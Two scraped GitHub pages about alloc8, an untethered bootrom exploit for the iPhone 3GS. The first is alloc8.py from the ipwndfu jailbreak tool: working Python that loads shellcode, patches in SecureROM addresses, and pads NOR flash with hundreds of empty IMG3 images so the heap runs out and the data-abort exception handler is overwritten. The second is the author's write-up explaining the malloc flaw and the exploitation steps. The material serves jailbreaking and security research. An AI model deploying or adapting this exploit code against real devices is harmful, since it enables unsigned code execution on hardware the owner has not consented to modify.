=== Content from github.com_6ecc01c6_20250120_232835.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faxi0mX%2Fipwndfu%2Fblob%2Fmaster%2Falloc8.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faxi0mX%2Fipwndfu%2Fblob%2Fmaster%2Falloc8.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=axi0mX%2Fipwndfu)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[axi0mX](/axi0mX)
/
**[ipwndfu](/axi0mX/ipwndfu)**
Public

* [Notifications](/login?return_to=%2Faxi0mX%2Fipwndfu) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Faxi0mX%2Fipwndfu)
* [Star
   7.1k](/login?return_to=%2Faxi0mX%2Fipwndfu)

* [Code](/axi0mX/ipwndfu)
* [Issues
  155](/axi0mX/ipwndfu/issues)
* [Pull requests
  17](/axi0mX/ipwndfu/pulls)
* [Actions](/axi0mX/ipwndfu/actions)
* [Projects
  0](/axi0mX/ipwndfu/projects)
* [Security](/axi0mX/ipwndfu/security)
* [Insights](/axi0mX/ipwndfu/pulse)

Additional navigation options

* [Code](/axi0mX/ipwndfu)
* [Issues](/axi0mX/ipwndfu/issues)
* [Pull requests](/axi0mX/ipwndfu/pulls)
* [Actions](/axi0mX/ipwndfu/actions)
* [Projects](/axi0mX/ipwndfu/projects)
* [Security](/axi0mX/ipwndfu/security)
* [Insights](/axi0mX/ipwndfu/pulse)

## Files

 master
## Breadcrumbs

1. [ipwndfu](/axi0mX/ipwndfu/tree/master)
/
# alloc8.py

Copy path Blame  Blame
## Latest commit

## History

[History](/axi0mX/ipwndfu/commits/master/alloc8.py)125 lines (108 loc) · 4.14 KB master
## Breadcrumbs

1. [ipwndfu](/axi0mX/ipwndfu/tree/master)
/
# alloc8.py

Top
## File metadata and controls

* Code
* Blame

125 lines (108 loc) · 4.14 KB[Raw](https://github.com/axi0mX/ipwndfu/raw/refs/heads/master/alloc8.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import copy, struct, sys
alloc8\_constants\_359\_3 = [ 0x84034000, # 1 - MAIN\_STACK\_ADDRESS 0x544, # 2 - clean\_invalidate\_data\_cache 0x84024020, # 3 - gNorImg3List 0x1ccd, # 4 - free 0x3ca1, # 5 - exit\_critical\_section 0x451d, # 6 - home\_button\_pressed 0x450d, # 7 - power\_button\_pressed 0x44e1, # 8 - cable\_connected 0x696c6c62, # 9 - ILLB\_MAGIC 0x1f6f, # 10 - get\_nor\_image 0x84000000, # 11 - LOAD\_ADDRESS 0x24000, # 12 - MAX\_SIZE 0x3969, # 13 - jump\_to 0x38a1, # 14 - usb\_create\_serial\_number\_string 0x8e7d, # 15 - strlcat 0x349d, # 16 - usb\_wait\_for\_image 0x84024228, # 17 - gLeakingDFUBuffer 0x65786563, # 18 - EXEC\_MAGIC 0x1f79, # 19 - memz\_create 0x1fa1, # 20 - memz\_destroy 0x696d6733, # 21 - IMG3\_STRUCT\_MAGIC 0x4d656d7a, # 22 - MEMZ\_STRUCT\_MAGIC 0x1fe5, # 23 - image3\_create\_struct 0x2655, # 24 - image3\_load\_continue 0x277b, # 25 - image3\_load\_fail]
alloc8\_constants\_359\_3\_2 = [ 0x84034000, # 1 - MAIN\_STACK\_ADDRESS 0x544, # 2 - clean\_invalidate\_data\_cache 0x84024020, # 3 - gNorImg3List 0x1ccd, # 4 - free 0x3ca9, # 5 - exit\_critical\_section 0x4525, # 6 - home\_button\_pressed 0x4515, # 7 - power\_button\_pressed 0x44e9, # 8 - cable\_connected 0x696c6c62, # 9 - ILLB\_MAGIC 0x1f77, # 10 - get\_nor\_image 0x84000000, # 11 - LOAD\_ADDRESS 0x24000, # 12 - MAX\_SIZE 0x3971, # 13 - jump\_to 0x38a9, # 14 - usb\_create\_serial\_number\_string 0x8e85, # 15 - strlcat 0x34a5, # 16 - usb\_wait\_for\_image 0x84024228, # 17 - gLeakingDFUBuffer 0x65786563, # 18 - EXEC\_MAGIC 0x1f81, # 19 - memz\_create 0x1fa9, # 20 - memz\_destroy 0x696d6733, # 21 - IMG3\_STRUCT\_MAGIC 0x4d656d7a, # 22 - MEMZ\_STRUCT\_MAGIC 0x1fed, # 23 - image3\_create\_struct 0x265d, # 24 - image3\_load\_continue 0x2783, # 25 - image3\_load\_fail]
def empty\_img3(size): assert size >= 20 return struct.pack('<4s3I4s', 'Img3'[::-1], size, 0, 0, 'zero'[::-1]) + '\x00' \* (size - 20)
def exploit(nor, version): if version == '359.3': constants = alloc8\_constants\_359\_3 exceptions = [0x5620, 0x5630] elif version == '359.3.2': constants = alloc8\_constants\_359\_3\_2 exceptions = [0x5628, 0x5638] else: print 'ERROR: SecureROM version %s is not supported by alloc8.' % version sys.exit(1)
 for c in nor.parts[1]: assert c == '\x00' assert len(nor.images) < 32
 MAX\_SHELLCODE\_LENGTH = 460 with open('bin/alloc8-shellcode.bin', 'rb') as f: shellcode = f.read() assert len(shellcode) <= MAX\_SHELLCODE\_LENGTH
 # Shellcode has placeholder values for constants; check they match and replace with constants from config. placeholders\_offset = len(shellcode) - 4 \* len(constants) for i in range(len(constants)): offset = placeholders\_offset + 4 \* i (value,) = struct.unpack('<I', shellcode[offset:offset + 4]) assert value == 0xBAD00001 + i
 new\_nor = copy.deepcopy(nor) new\_nor.parts[1] = shellcode[:placeholders\_offset] + struct.pack('<%sI' % len(constants), \*constants) + '\x00' \* (MAX\_SHELLCODE\_LENGTH - len(shellcode))
 while len(new\_nor.images) < 713: new\_nor.images.append(empty\_img3(new\_nor.block\_size))
 # Image no. 714 must end at the end of the 4096-byte block. NOR\_READ\_SIZE = 4096 offset = 0 for image in new\_nor.images: offset += len(image) size = NOR\_READ\_SIZE - offset % NOR\_READ\_SIZE new\_nor.images.append(empty\_img3(size))
 # This image is copied to address 0x8. SHELLCODE\_ADDRESS overrides the data abort exception handler. SHELLCODE\_ADDRESS = 0x84026214 + 1 new\_nor.images.append(empty\_img3(52)[:40] + struct.pack('<4I', SHELLCODE\_ADDRESS, 0, \*exceptions))
 return new\_nor
def remove\_exploit(nor): assert len(nor.images) >= 700
 new\_nor = copy.deepcopy(nor)
 new\_images = [] for image in new\_nor.images: assert len(image) >= 20 if image[16:20] != 'zero'[::-1]: new\_images.append(image) assert len(new\_images) < 32
 new\_nor.images = new\_images new\_nor.parts[1] = '\x00' \* 460
 return new\_nor

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_29b7064b_20250120_232834.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faxi0mX%2Falloc8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faxi0mX%2Falloc8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=axi0mX%2Falloc8)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[axi0mX](/axi0mX)
/
**[alloc8](/axi0mX/alloc8)**
Public

* [Notifications](/login?return_to=%2Faxi0mX%2Falloc8) You must be signed in to change notification settings
* [Fork
  66](/login?return_to=%2Faxi0mX%2Falloc8)
* [Star
   374](/login?return_to=%2Faxi0mX%2Falloc8)

Write-up for alloc8 untethered bootrom exploit for iPhone 3GS

[374
stars](/axi0mX/alloc8/stargazers) [66
forks](/axi0mX/alloc8/forks) [Branches](/axi0mX/alloc8/branches) [Tags](/axi0mX/alloc8/tags) [Activity](/axi0mX/alloc8/activity)
 [Star](/login?return_to=%2Faxi0mX%2Falloc8)

 [Notifications](/login?return_to=%2Faxi0mX%2Falloc8) You must be signed in to change notification settings

* [Code](/axi0mX/alloc8)
* [Issues
  2](/axi0mX/alloc8/issues)
* [Pull requests
  0](/axi0mX/alloc8/pulls)
* [Actions](/axi0mX/alloc8/actions)
* [Projects
  0](/axi0mX/alloc8/projects)
* [Security](/axi0mX/alloc8/security)
* [Insights](/axi0mX/alloc8/pulse)

Additional navigation options

* [Code](/axi0mX/alloc8)
* [Issues](/axi0mX/alloc8/issues)
* [Pull requests](/axi0mX/alloc8/pulls)
* [Actions](/axi0mX/alloc8/actions)
* [Projects](/axi0mX/alloc8/projects)
* [Security](/axi0mX/alloc8/security)
* [Insights](/axi0mX/alloc8/pulse)

# axi0mX/alloc8

    master[Branches](/axi0mX/alloc8/branches)[Tags](/axi0mX/alloc8/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/axi0mX/alloc8/commits/master/) | | |
| [README](/axi0mX/alloc8/blob/master/README "README") | | [README](/axi0mX/alloc8/blob/master/README "README") |  |  |
| View all files | | |

## Repository files navigation

* README
```
Write-up for alloc8: untethered bootrom exploit for iPhone 3GS

alloc8 brings freedom to millions of iPhone 3GS devices, forever, by exploiting a powerful vulnerability in function malloc in the bootrom. Both revisions of iPhone 3GS bootrom are vulnerable, but old bootrom is also vulnerable to 24Kpwn, which is faster than alloc8.

*** JAILBREAK TOOL ***
ipwndfu:
<https://github.com/axi0mX/ipwndfu>

*** AFFECTED DEVICES ***
iPhone 3GS (old bootrom)
iPhone 3GS (new bootrom)

*** VULNERABILITY ***

This is not a typical heap bug. This is a bug in implementation of the heap itself.

void *malloc(size_t size);

In C programming language, function malloc should return NULL if it is unable to allocate memory of the requested size. Caller should check if returned pointer is NULL and handle the error:

void *pointer = malloc(size);

if (pointer == NULL) {
	// handle error
} else {
	// pointer is valid, continue
}

In S5L8920 bootrom (and some very old versions of iBoot) function malloc is not implemented correctly. When it is unable to allocate memory, instead of NULL it returns a pointer to memory address 0x8. Callers check if returned pointer is NULL and then treat that pointer as valid.

*** EXPLOITATION ***

First, we must be able to allocate enough data on the heap to make it run out of memory. Apple seems to have done a good job in reducing the attack surface of the bootrom, and it is far from certain that this can be achieved.

There seems to be only a single way to fill up the heap during a normal boot. If we add additional IMG3 images to NOR, bootrom will parse all of them and allocate a 44-byte structure on the heap for each image. However, only the first image, LLB, needs to be parsed, because bootrom never uses any other image from NOR. Although this is not a vulnerability by itself, Apple changed this behavior later, in S5L8930 bootrom, and it no longer seems to be possible to fill up the heap in bootrom during normal boot.

Second, once the heap is full, we must be able to use the pointer(s) to memory address 0x8 for reading or writing in a way that gets us arbitrary code execution before any panic or fatal memory corruption occurs.

On ARMv7 processors, the exception vector table is located at memory address 0x0. The exception vector table contains critical instructions and data used for handling exceptions. Corrupting this exception vector table is a technique commonly used for exploits on ARMv7 processors.

Although the exception vector table in bootrom comes from read-only memory, the exception vector table data is cached in L1 data cache, and it is possible to change behavior of the exception vector table by overwriting this data. Overwriting instructions has no effect, because instructions are cached separately in L1 instruction cache, and writes to memory are cached in L1 data cache, not L1 instruction cache.

This data contains pointers to exception handlers used by bootrom, and changing any of these pointers to address of our shellcode makes the processor jump to our shellcode when that exception occurs.

When bootrom is parsing IMG3 images from NOR, it reads 4096 bytes of data from NOR at a time into a temporary buffer. When there is a large number of IMG3 images in NOR, this temporary buffer is the first one which cannot be allocated on the heap, and it gets allocated at memory address 0x8. At that point, 4096 bytes of data from NOR, which we have full control over, gets copied to memory starting at memory address 0x8.

This gives us the ability to write arbitrary data over data in the exception vector table and additional data which is located after it. We will flash a copy of 4096 bytes of data from bootrom to NOR and override the pointer to data abort exception handler, effectively using this primitive to override 4 bytes in the exception vector table in memory and keep everything else the same.

Once reading from NOR is complete, bootrom attempts to free the temporary buffer at memory address 0x8. 8 bytes located immediately before allocated memory are used for heap metadata, but for this bad pointer the metadata is invalid. This leads to a bad memory access in function free, which triggers a data abort exception and the processor jumps to our shellcode.

*** SHELLCODE ***

First 52 bytes of NOR contain an IMG2 header with NOR metadata that should not be changed. Before bootrom starts parsing images in NOR, the first 512 bytes of NOR are copied to memory allocated on the heap, but only 52 bytes are actually used. The remaining 460 bytes are unused and can be safely used for shellcode. Memory address where this data gets allocated is always the same.

*** POST-EXPLOITATION ***

To clean up, shellcode returns from exception, sets a new stack top, restores the original pointer for data abort handler, and frees 44-byte structures which are occupying most of the heap, leaving only the one required for normal boot, LLB.

At this point, shellcode can continue booting an unsigned LLB image from NOR or go to pwned DFU Mode and boot an unsigned image sent over USB.

```

## About

Write-up for alloc8 untethered bootrom exploit for iPhone 3GS

### Resources

[Readme](#readme-ov-file)

[Activity](/axi0mX/alloc8/activity)
### Stars

[**374**
stars](/axi0mX/alloc8/stargazers)
### Watchers

[**24**
watching](/axi0mX/alloc8/watchers)
### Forks

[**66**
forks](/axi0mX/alloc8/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Faxi0mX%2Falloc8&report=axi0mX+%28user%29)

## [Releases](/axi0mX/alloc8/releases)

No releases published

## [Packages 0](/users/axi0mX/packages?repo_name=alloc8)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


